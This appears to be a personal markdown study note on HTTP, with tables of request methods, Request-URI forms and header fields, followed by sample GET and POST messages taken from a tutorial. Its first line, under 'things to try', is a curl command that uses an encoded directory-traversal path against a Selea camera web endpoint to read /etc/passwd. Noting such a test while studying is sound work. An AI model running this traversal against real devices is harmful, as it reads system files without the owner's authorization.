## things to try:
$ curl http://192.168.1.17:8080/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd




|Request Method | Description|
|-------|------------|
|GET | The GET method is used to retrieve information from the given server using a given URI. Requests using GET should only retrieve data and should have no other effect on the data.|
|HEAD | Same as GET, but it transfers the status line and the header section only.|
|POST | A POST request is used to send data to the server, for example, customer information, file upload, etc. using HTML forms.|
|PUT | Replaces all the current representations of the target resource with the uploaded content.|
|DELETE | Removes all the current representations of the target resource given by URI.|
|CONNECT | Establishes a tunnel to the server identified by a given URI.|
|OPTIONS | Describe the communication options for the target resource.|
|TRACE | Performs a message loop back test along with the path to the target resource.|
|PATCH | The PATCH method is used to apply partial modifications to a resource.|

|Request-URI | Description|
|------------|------------|
|asterisk * | used when an HTTP request does not apply to a particular resource, but to the server itself, and is only allowed when the method used does not necessarily apply to a resource. For example: ```OPTIONS * HTTP/1.1``` |
| absoluteURI | used when an HTTP request is being made to a proxy. The proxy is requested to forward the request or service from a valid cache, and return the response. For example: ```GET http://www.w3.org/pub/WWW/TheProject.html HTTP/1.1``` |
|Request-URI | The most common form of Request-URI is that used to identify a resource on an origin server or gateway. For example, a client wishing to retrieve a resource directly from the origin server would create a TCP connection to port 80 of the host "www.w3.org" and send the following lines: ```GET /pub/WWW/TheProject.html HTTP/1.1``` |



|Request Header Fields|
|---------------------|
|Accept-Charset|
|Accept-Encoding|
|Accept-Language|
|Authorization|
|Expect|
|From|
|Host|
|If-Match|
|If-Modified-Since|
|If-None-Match|
|If-Range|
|If-Unmodified-Since|
|Max-Forwards|
|Proxy-Authorization|
|Range|
|Referer|
|TE|
|User-Agent|



## Examples of Request Messages
```
GET /hello.htm HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: www.tutorialspoint.com
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
```

```
POST /cgi-bin/process.cgi HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: www.tutorialspoint.com
Content-Type: application/x-www-form-urlencoded
Content-Length: length
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

licenseID=string&content=string&/paramsXML=string
```

```
POST /cgi-bin/process.cgi HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: www.tutorialspoint.com
Content-Type: text/xml; charset=utf-8
Content-Length: length
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

<?xml version="1.0" encoding="utf-8"?>
<string xmlns="http://clearforest.com/">string</string>
```











